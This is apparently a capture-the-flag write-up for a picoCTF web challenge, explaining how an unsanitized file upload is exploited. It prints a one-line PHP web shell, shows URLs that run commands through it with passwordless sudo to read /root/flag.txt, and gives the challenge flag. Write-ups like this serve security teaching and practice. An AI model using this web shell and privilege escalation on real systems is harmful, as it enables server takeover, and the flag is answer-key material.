Hints:
1.File upload was not sanitized
2.Whenever you get a shell on a remote machine, check sudo -l

How to Solve it:
we have a website that has a functionality of uploading profile pictures.
the first thing i noticed that the and file can be uploaded (txt,pdf ..)
so i created a php file called it goto.php.
the php file had this command: <?php system($_GET['cmd']); ?>
i uploaded the file into the page. 
each time we upload a file, the page responds with the path where the file was saved.
so after i uploaded the php file i got the path where it was saved to, so i visited that path and got to a page that was written on it : www-data.
it means we can excute commands on the target.
i ran sudo -l as hinted in the mission. and got this:

it means the root can run commands with no password needed, 
i entered this url : http://standard-pizzas.picoctf.net:57929/uploads/goto.php?cmd=sudo%20ls%20/root, and to a page where it said flag.txt:

so i entered: http://standard-pizzas.picoctf.net:57929/uploads/goto.php?cmd=sudo%20cat%20/root/flag.txt
and finally got the flag:

the flag: picoCTF{wh47_c4n_u_d0_wPHP_5f3c22c0}
